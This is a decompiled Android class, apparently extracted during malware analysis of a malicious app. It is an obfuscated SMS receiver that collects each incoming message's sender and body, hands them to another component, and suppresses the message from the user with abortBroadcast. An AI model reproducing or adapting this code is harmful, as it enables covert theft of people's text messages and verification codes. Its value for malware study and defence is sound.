package com.zjxyxnvvp.nxvxchltf.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.util.e;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class AIUbawuidBAWUdi extends BroadcastReceiver {
    private static short[] $ = {31550, 31543, 31530, 31541, 31545, 31532, 28808, 28828, 28813, 28811, 30899, 30893, 30899, 30912, 30854, 30866, 30863, 30861, 30912, 30261, 30255, 31955, 31952, 31960, 31960, 31962, 31963, 31968, 31948, 31954, 31948, 27443, 27405, 27411, 27429, 27410, 27410, 27456};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        try {
            d dVar = d.e;
            Bundle extras = intent.getExtras();
            String str = "";
            if (extras != null) {
                String string = extras.getString($(0, 6, 31576));
                Object[] objArr = (Object[]) extras.get($(6, 10, 28920));
                if (objArr != null) {
                    int length = objArr.length;
                    SmsMessage[] smsMessageArr = new SmsMessage[length];
                    for (int i = 0; i < length; i++) {
                        smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i], string);
                        str = (str + $(10, 19, 30944) + smsMessageArr[i].getOriginatingAddress()) + $(19, 21, 30223) + smsMessageArr[i].getMessageBody();
                    }
                    dVar.f314a.d(context, $(21, 31, 31935), str);
                    abortBroadcast();
                    eifbiaFBAUIFB.b(context, true);
                }
            }
        } catch (Throwable th) {
            th.printStackTrace();
            e.a($(31, 38, 27488) + th.getMessage());
        }
    }
}
